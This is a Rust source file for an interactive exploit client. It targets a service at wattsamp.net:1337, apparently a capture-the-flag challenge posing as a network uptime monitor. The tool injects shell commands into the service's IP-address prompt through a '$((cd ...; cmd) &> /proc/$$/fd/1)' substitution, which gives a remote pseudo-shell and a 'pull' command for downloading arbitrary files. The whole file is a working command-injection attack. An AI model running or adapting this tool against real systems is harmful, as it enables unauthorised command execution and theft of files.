#![allow(unused_imports)]

extern crate rustyline;
extern crate async_std;
extern crate futures;
extern crate path_clean;
#[macro_use] extern crate simple_error;

use rustyline::{
    error::ReadlineError,
    Editor
};
use async_std::{
    fs::File,
    io::{
        BufReader,
        timeout
    },
    task,
    net::TcpStream,
};
use futures::{AsyncReadExt, AsyncWriteExt, AsyncBufReadExt};
use std::process::exit;
use std::time::Duration;
use std::path::{PathBuf, Path};
use simple_error::SimpleError;
use path_clean::PathClean;

type AResult<T> = std::result::Result<T, Box<dyn std::error::Error + Send + Sync>>;

fn main() {
    let mut rl = Editor::<()>::new();
    if rl.load_history("history.txt").is_err() {
        println!("No previous history.");
    }

    loop {
        let readline = rl.readline("> ");

        match readline {
            Ok(line) => {
                rl.add_history_entry(line.as_str());

                let items: Vec<&str> = line.split_whitespace().collect();
                if items.len() == 0 {continue;}

                match items[0] {
                    "shell" if items.len() == 1 => match shell(&mut rl) {
                        Ok(()) => continue,
                        Err(e) => {println!("Error: {:?}", e); continue;}
                    },
                    "pull" if items.len() == 3 => match task::block_on(pull(&items)){
                        Ok(()) => continue,
                        Err(e) => {println!("Error: {:?}", e); continue;}
                    },
                    "help" if items.len() == 1 => help(),
                    "quit" | "exit" if items.len() == 1 => break,
                    _ => {
                        println!("No such command, or incorrect number of arguments. Type help.");
                        continue;
                    },
                }
            },
            Err(ReadlineError::Interrupted) => { println!("CTRL-C"); },
            Err(ReadlineError::Eof) => { println!("CTRL-D"); break; },
            Err(err) => { println!("Error: {:?}", err); break; }
        }
    }

    rl.save_history("history.txt").unwrap();
}

fn shell(rl: &mut Editor<()>) -> AResult<()> {
    let mut path = PathBuf::from("/");

    loop {
        let readline = rl.readline(
            format!("{}> ", path.as_os_str().to_str()
                .ok_or(SimpleError::new("Path isn't valid UTF-8"))?).as_str()
        );

        match readline {
            Ok(line) => {
                rl.add_history_entry(line.as_str());
                let line = line.trim();

                match line {
                    "quit" | "exit" => break,
                    _ if line.starts_with("cd ") => {
                        let (_, new_path) = line.split_at(3);
                        path.push(new_path);
                        path = path.clean();
                    }
                    _ => match task::block_on(shell_call(&path, &line)){
                        Ok(()) => continue,
                        Err(e) => {println!("Error: {:?}", e); continue;}
                    },
                }
            },
            Err(ReadlineError::Interrupted) => { println!("CTRL-C"); },
            Err(ReadlineError::Eof) => { println!("CTRL-D"); break; },
            Err(err) => { println!("Error: {:?}", err); break; }
        }
    }

    Ok(())
}

async fn shell_call(path: &Path, line: &str) -> AResult<()> {
    // Open r and w streams
    let stream = TcpStream::connect("wattsamp.net:1337").await?;
    let (r, mut w) = stream.split();
    let mut r = BufReader::new(r);

    // Read Prologue
    const PROLOGUE: &str = "~~~~ WATTSAMP ENERGY ~~~~\n\
                            Network Administration Panel  --  Uptime Monitor \n\
                            Enter IP address: ";
    let mut p_temp: [u8; PROLOGUE.len()] = [0; PROLOGUE.len()];
    r.read_exact(&mut p_temp).await?;

    // Send request
    w.write_all(format!("$((cd {}; {}) &> /proc/$$/fd/1)\n",
        path.as_os_str().to_str().ok_or(SimpleError::new("Path isn't valid UTF-8"))?,
        line).as_bytes()).await?;

    // Receive Response
    let mut s = String::new();
    let mut end_new_line = false;
    loop {
        let r = timeout(Duration::from_secs(5), r.read_line(&mut s)).await?;

        match r {
            0 => break,
            _ if end_new_line => {
                println!();
                end_new_line = false;
            }
            1 if s.as_str() == "\n" => {
                end_new_line = true;
                s.clear();
                continue;
            },
            _ => ()
        }


        print!("{}", s);
        s.clear();
    }

    Ok(())
}

async fn pull(items: &[&str]) -> AResult<()> {
    // Open File
    let mut out = File::create(items[2]).await?;

    // Open r and w streams
    let stream = TcpStream::connect("wattsamp.net:1337").await?;
    let (r, mut w) = stream.split();
    let mut r = BufReader::new(r);

    // Read Prologue
    const PROLOGUE: &str = "~~~~ WATTSAMP ENERGY ~~~~\n\
                            Network Administration Panel  --  Uptime Monitor \n\
                            Enter IP address: ";
    let mut p_temp: [u8; PROLOGUE.len()] = [0; PROLOGUE.len()];
    r.read_exact(&mut p_temp).await?;

    // Send request
    w.write_all(format!("$((cat '{}') &> /proc/$$/fd/1)\n", items[1]).as_bytes()).await?;

    // Receive Response
    let mut s = String::new();
    let mut end_new_line = false;
    loop {
        let r = timeout(Duration::from_secs(5), r.read_line(&mut s)).await?;
        match r {
            0 => break,
            _ if end_new_line => {
                out.write_all("\n".as_bytes()).await?;
                end_new_line = false;
            }
            1 if s.as_str() == "\n" => {
                end_new_line = true;
                s.clear();
                continue;
            },
            _ => ()
        }

        out.write_all(s.as_bytes()).await?;
        s.clear();
    }

    Ok(())
}

fn help() {
    println!("1) `shell`                               Drop into an interactive shell and allow users to gracefully `exit`\
            \n2) `pull <remote-path> <local-path>`     Download files\
            \n3) `help`                                Shows this help menu\
            \n4) `quit`                                Quit the shell");
}